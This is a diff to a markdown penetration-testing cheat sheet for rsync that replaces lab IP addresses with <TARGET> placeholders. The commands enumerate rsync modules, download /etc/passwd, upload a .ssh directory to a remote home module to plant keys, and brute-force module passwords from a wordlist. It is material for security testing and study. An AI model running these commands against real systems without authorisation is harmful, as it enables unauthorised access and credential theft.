@@ -4,44 +4,43 @@ date: 2024-7-12
 tags: ["rsync"]
 ---
 
----
 ### Basic Commands
 
 <div>
 
-```bash
+```console
 # List directory ('/')
-rsync --list-only -a rsync://10.10.11.10/
-``` 
+rsync --list-only -a rsync://<TARGET>/
+```
 
-```bash
+```console
 # List directory ('/') with ipv6
-rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/
-``` 
+rsync --list-only -a rsync://[<TARGET_IPV6>]:8730/
+```
 
-```bash
+```console
 # List a file
-rsync --list-only -a rsync://10.10.11.10/etc/passwd
+rsync --list-only -a rsync://<TARGET>/etc/passwd
 ```
 
-```bash
+```console
 # List files (wildcard)
-rsync --list-only -a rsync://10.10.11.10/etc/rsync*
+rsync --list-only -a rsync://<TARGET>/etc/rsync*
 ```
 
-```bash
+```console
 # Get a file
-rsync -a rsync://10.10.11.10/etc/passwd .
+rsync -a rsync://<TARGET>/etc/passwd .
 ```
 
-```bash
+```console
 # Get files (wildcard)
-rsync -a rsync://10.10.11.10/etc/rsync* .
+rsync -a rsync://<TARGET>/etc/rsync* .
 ```
 
-```bash
+```console
 # Copy files recusively to remote (With Creds)
-export RSYNC_PASSWORD=<PASSWORD>; rsync -aR .ssh/ rsync://<USER>@10.10.11.10/home_user/
+export RSYNC_PASSWORD='<PASSWORD>'; rsync -aR .ssh/ rsync://<USER>@<TARGET>/home_user/
 ```
 
 </div>
@@ -54,9 +53,9 @@ export RSYNC_PASSWORD=<PASSWORD>; rsync -aR .ssh/ rsync://<USER>@10.10.11.10/hom
 
 <div>
 
-```bash
+```console
 # Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)
-cat passwords.txt | while read password; do export RSYNC_PASSWORD=${password}; rsync --list-only rsync://user@10.10.11.10/home_user 2>&1 | grep -q "auth failed on module home_user" || { echo "[+] Found: ${RSYNC_PASSWORD}"; break; } done
+cat passwords.txt | while read password; do export RSYNC_PASSWORD=${password}; rsync --list-only rsync://user@<TARGET>/home_user 2>&1 | grep -q "auth failed on module home_user" || { echo "[+] Found: ${RSYNC_PASSWORD}"; break; } done
 ```
 
 </div>
